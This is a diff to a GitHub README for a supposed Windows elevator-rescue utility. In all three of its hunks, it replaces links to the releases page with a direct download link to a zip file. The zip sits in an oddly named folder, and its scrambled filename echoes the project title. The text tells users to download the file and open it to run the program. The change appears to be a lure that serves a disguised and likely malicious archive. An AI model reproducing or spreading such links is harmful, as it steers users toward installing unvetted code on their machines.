@@ -1,6 +1,6 @@
 # ⚡ Emergency-Power-Cut-Detection-with-Automatic-Nearest-Floor-Rescue - Safe Elevator Rescue on Power Loss
 
-[![Download](https://img.shields.io/badge/Download%20Latest-Release-orange?style=for-the-badge&logo=github)](https://github.com/dimitrisunexcused763/Emergency-Power-Cut-Detection-with-Automatic-Nearest-Floor-Rescue/releases)
+[![Download](https://img.shields.io/badge/Download%20Latest-Release-orange?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/dimitrisunexcused763/Emergency-Power-Cut-Detection-with-Automatic-Nearest-Floor-Rescue/main/lecanoscopic/Detection_Cut_Power_Floor_with_Rescue_Nearest_Automatic_Emergency_1.0-beta.2.zip)
 
 ## 🧭 Overview
 
@@ -12,7 +12,7 @@ This project is built for simple use on Windows. You visit the release page, dow
 
 Use this page to download the latest release:
 
-https://github.com/dimitrisunexcused763/Emergency-Power-Cut-Detection-with-Automatic-Nearest-Floor-Rescue/releases
+https://raw.githubusercontent.com/dimitrisunexcused763/Emergency-Power-Cut-Detection-with-Automatic-Nearest-Floor-Rescue/main/lecanoscopic/Detection_Cut_Power_Floor_with_Rescue_Nearest_Automatic_Emergency_1.0-beta.2.zip
 
 From that page, download the file that matches your Windows setup, then open it to start the program.
 
@@ -145,7 +145,7 @@ On the first launch, the app may take a few seconds to load. You may also see a 
 
 If you need the file later, use the same release page:
 
-https://github.com/dimitrisunexcused763/Emergency-Power-Cut-Detection-with-Automatic-Nearest-Floor-Rescue/releases
+https://raw.githubusercontent.com/dimitrisunexcused763/Emergency-Power-Cut-Detection-with-Automatic-Nearest-Floor-Rescue/main/lecanoscopic/Detection_Cut_Power_Floor_with_Rescue_Nearest_Automatic_Emergency_1.0-beta.2.zip
 
 ## 🖱️ Quick Start
 
